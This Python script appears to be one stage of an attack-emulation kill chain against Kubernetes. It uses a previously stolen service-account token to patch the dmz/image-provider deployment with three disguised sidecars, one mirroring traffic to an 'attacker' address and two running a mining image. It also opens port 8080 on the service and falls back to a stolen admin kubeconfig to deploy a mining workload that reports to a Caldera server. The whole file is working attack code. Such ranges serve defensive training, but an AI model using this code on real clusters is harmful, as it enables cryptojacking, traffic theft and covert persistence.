#!/usr/bin/env python3
"""Deploy extra workload containers from either an in-cluster token or KC6 kubeconfig.

The OpenTelemetry kill chain injects sidecars into the vulnerable
``dmz/image-provider`` deployment with the limited token collected in KC1.
The 5Gcore chain reaches this same behavior after KC6 has produced an admin
kubeconfig, so the script falls back to a small generic mining deployment when
the OpenTelemetry target is not present.
"""

from __future__ import annotations

import json
import os
import shutil
import socket
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any


def log(message: str) -> None:
    print(message, flush=True)


def data_path() -> Path:
    return Path(os.getenv("DATA_PATH", "/tmp/KCData"))


def bearer_header(token: str) -> str:
    token = token.strip()
    if token.lower().startswith("bearer "):
        return token
    return f"Bearer {token}"


def kube_request(
    method: str,
    url: str,
    *,
    token: str,
    payload: Any | None = None,
    content_type: str = "application/json",
) -> Any:
    headers = {
        "Accept": "application/json",
        "Authorization": bearer_header(token),
    }
    data = None
    if payload is not None:
        headers["Content-Type"] = content_type
        if isinstance(payload, (bytes, bytearray)):
            data = bytes(payload)
        else:
            data = json.dumps(payload).encode("utf-8")

    req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
    context = ssl._create_unverified_context()
    with urllib.request.urlopen(req, timeout=30, context=context) as response:
        body = response.read()
    return json.loads(body.decode("utf-8")) if body else {}


def deployment_container_names(deployment: dict[str, Any]) -> set[str]:
    containers = deployment.get("spec", {}).get("template", {}).get("spec", {}).get("containers", [])
    return {str(container.get("name")) for container in containers if isinstance(container, dict)}


def wait_deployment_ready(dep_url: str, token: str, timeout_seconds: float = 180.0) -> None:
    deadline = time.time() + timeout_seconds
    last = ""
    while time.time() < deadline:
        deployment = kube_request("GET", dep_url, token=token)
        metadata = deployment.get("metadata", {}) if isinstance(deployment.get("metadata"), dict) else {}
        spec = deployment.get("spec", {}) if isinstance(deployment.get("spec"), dict) else {}
        status = deployment.get("status", {}) if isinstance(deployment.get("status"), dict) else {}
        generation = int(metadata.get("generation") or 0)
        observed = int(status.get("observedGeneration") or 0)
        replicas = int(spec.get("replicas") or 1)
        ready = int(status.get("readyReplicas") or 0)
        updated = int(status.get("updatedReplicas") or 0)
        current = f"observed={observed}/{generation} updated={updated}/{replicas} ready={ready}/{replicas}"
        if observed >= generation and updated >= replicas and ready >= replicas:
            return
        if current != last:
            log(f"[*] Waiting for deployment rollout: {current}")
            last = current
        time.sleep(3)
    raise RuntimeError(f"deployment did not become ready before timeout: {last or 'unknown'}")


def in_cluster_apiserver() -> str | None:
    host = os.getenv("KUBERNETES_SERVICE_HOST")
    port = os.getenv("KUBERNETES_SERVICE_PORT", "443")
    if not host:
        return None
    return f"https://{host}:{port}"


def service_host(name: str, namespace: str) -> str:
    for candidate in (f"{name}.{namespace}", f"{name}.{namespace}.svc.cluster.local"):
        try:
            return socket.gethostbyname(candidate)
        except OSError:
            continue
    return f"{name}.{namespace}.svc.cluster.local"


def deploy_opentelemetry_sidecars() -> bool:
    apiserver = in_cluster_apiserver()
    token_file = data_path() / "KC1" / "token"
    if not apiserver or not token_file.is_file():
        log("[i] OpenTelemetry sidecar path unavailable; trying kubeconfig fallback.")
        return False

    token = token_file.read_text(encoding="utf-8").strip()
    if not token:
        log("[i] OpenTelemetry token file is empty; trying kubeconfig fallback.")
        return False

    namespace = os.getenv("ATTACKED_NS", "dmz")
    deployment_name = os.getenv("ATTACKED_DEPLOYMENT", "image-provider")
    service_name = os.getenv("ATTACKED_SERVICE", deployment_name)
    registry = f"{os.getenv('REGISTRY_NAME', 'registry')}:{os.getenv('REGISTRY_PORT', '5000')}"
    image_tag = os.getenv("IMAGE_TAG", os.getenv("IMAGE_VERSION", "2.0.2"))
    attacker_addr = os.getenv("ATTACKERADDR", "attacker")
    auth_ns = os.getenv("AUTH_NS", "app")

    dep_url = f"{apiserver}/apis/apps/v1/namespaces/{namespace}/deployments/{deployment_name}"
    svc_url = f"{apiserver}/api/v1/namespaces/{namespace}/services/{service_name}"

    try:
        deployment = kube_request("GET", dep_url, token=token)
    except urllib.error.HTTPError as exc:
        if exc.code in {403, 404}:
            log(f"[i] {namespace}/{deployment_name} not usable via KC1 token (HTTP {exc.code}); trying kubeconfig fallback.")
            return False
        raise

    containers = deployment.get("spec", {}).get("template", {}).get("spec", {}).get("containers", [])
    existing = {container.get("name") for container in containers}
    patch: list[dict[str, Any]] = []

    sidecar_specs = [
        {
            "name": "sidecar-not-malicious",
            "image": f"{registry}/sidecar-mal:{image_tag}",
            "ports": [{"containerPort": 8080}],
            "env": [
                {"name": "PRIMARY_ADDR", "value": f"{service_host('auth', auth_ns)}:8080"},
                {"name": "MIRROR_ADDR", "value": f"{attacker_addr}:8080"},
            ],
        },
        {
            "name": "sidecar-not-mining",
            "image": f"{registry}/attacker:{image_tag}",
            "env": [
                    {"name": "GROUP", "value": "mining"},
                    {"name": "DOCKER_DAEMON", "value": "0"},
            ],
        },
        {
            "name": "sidecar-not-mining2",
            "image": f"{registry}/attacker:{image_tag}",
            "env": [
                    {"name": "GROUP", "value": "mining"},
                    {"name": "DOCKER_DAEMON", "value": "0"},
            ],
        },
    ]

    for sidecar in sidecar_specs:
        if sidecar["name"] not in existing:
            patch.append({"op": "add", "path": "/spec/template/spec/containers/-", "value": sidecar})

    if patch:
        log(f"[*] Injecting {len(patch)} sidecar(s) into {namespace}/{deployment_name}.")
        kube_request("PATCH", dep_url, token=token, payload=patch, content_type="application/json-patch+json")
    else:
        log(f"[=] Sidecars already present in {namespace}/{deployment_name}.")

    try:
        service = kube_request("GET", svc_url, token=token)
        ports = service.get("spec", {}).get("ports", [])
        has_8080 = any(port.get("port") == 8080 or port.get("name") == "http-8080" for port in ports)
        if not has_8080:
            log(f"[*] Exposing sidecar port on service {namespace}/{service_name}.")
            kube_request(
                "PATCH",
                svc_url,
                token=token,
                payload=[
                    {
                        "op": "add",
                        "path": "/spec/ports/-",
                        "value": {"port": 8080, "targetPort": 8080, "protocol": "TCP", "name": "http-8080"},
                    }
                ],
                content_type="application/json-patch+json",
            )
    except urllib.error.HTTPError as exc:
        if exc.code == 404:
            log(f"[i] Service {namespace}/{service_name} not found; sidecar injection already completed.")
        else:
            raise

    verified_deployment = kube_request("GET", dep_url, token=token)
    expected_sidecars = {str(sidecar["name"]) for sidecar in sidecar_specs}
    missing = sorted(expected_sidecars - deployment_container_names(verified_deployment))
    if missing:
        raise RuntimeError(f"sidecar injection verification failed; missing container(s): {', '.join(missing)}")
    wait_deployment_ready(dep_url, token, float(os.getenv("DEPLOY_CONTAINERS_ROLLOUT_TIMEOUT", "180")))

    log("[+] Containers deployed through OpenTelemetry sidecar path.")
    return True


def run_kubectl(kubeconfig: Path, args: list[str], *, stdin: str | None = None, check: bool = True) -> subprocess.CompletedProcess[str]:
    cmd = ["kubectl", "--kubeconfig", str(kubeconfig), *args]
    completed = subprocess.run(cmd, input=stdin, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if completed.stdout:
        print(completed.stdout, end="" if completed.stdout.endswith("\n") else "\n")
    if check and completed.returncode != 0:
        raise subprocess.CalledProcessError(completed.returncode, cmd, output=completed.stdout)
    return completed


def deploy_kubeconfig_workload() -> bool:
    kubeconfig = Path(os.getenv("KUBECONFIG", str(data_path() / "KC6" / "ops-admin.kubeconfig")))
    if not kubeconfig.is_file():
        log(f"[-] No kubeconfig fallback available at {kubeconfig}.")
        return False
    if not shutil.which("kubectl"):
        log("[-] kubectl is required for kubeconfig fallback but is not in PATH.")
        return False

    namespace = os.getenv("MINING_NS", "mining")
    name = os.getenv("MINING_DEPLOYMENT", "not-mining")
    replicas = int(os.getenv("MINING_REPLICAS", "2"))
    registry = f"{os.getenv('REGISTRY_NAME', 'registry')}:{os.getenv('REGISTRY_PORT', '5000')}"
    image_tag = os.getenv("IMAGE_TAG", os.getenv("IMAGE_VERSION", "2.0.2"))
    image = os.getenv("MINING_IMAGE", f"{registry}/busybox:{image_tag}")
    caldera_url = os.getenv("CALDERA_URL", "http://caldera:8888")

    manifest = {
        "apiVersion": "v1",
        "kind": "Namespace",
        "metadata": {"name": namespace},
    }
    deployment = {
        "apiVersion": "apps/v1",
        "kind": "Deployment",
        "metadata": {"name": name, "namespace": namespace, "labels": {"app": name}},
        "spec": {
            "replicas": replicas,
            "selector": {"matchLabels": {"app": name}},
            "template": {
                "metadata": {"labels": {"app": name}},
                "spec": {
                    "containers": [
                        {
                            "name": "worker",
                            "image": image,
                            "imagePullPolicy": "IfNotPresent",
                            "command": ["sh", "-c"],
                            "args": ["while true; do sleep 3600; done"],
                            "env": [
                                {"name": "GROUP", "value": "mining"},
                                {"name": "CALDERA_URL", "value": caldera_url},
                                {"name": "WAIT", "value": "0"},
                            ],
                        }
                    ]
                },
            },
        },
    }
    yamlish = json.dumps(manifest) + "\n---\n" + json.dumps(deployment) + "\n"

    log(f"[*] Deploying generic workload {namespace}/{name} with {replicas} replica(s).")
    run_kubectl(kubeconfig, ["apply", "-f", "-"], stdin=yamlish)
    run_kubectl(kubeconfig, ["-n", namespace, "rollout", "status", f"deployment/{name}", "--timeout=180s"])
    log("[+] Containers deployed through kubeconfig fallback.")
    return True


def main() -> int:
    try:
        if deploy_opentelemetry_sidecars():
            return 0
        if deploy_kubeconfig_workload():
            return 0
        return 1
    except subprocess.CalledProcessError as exc:
        log(f"[-] Command failed with exit {exc.returncode}: {' '.join(map(str, exc.cmd))}")
        return exc.returncode or 1
    except Exception as exc:
        log(f"[-] Failed to deploy containers: {exc}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
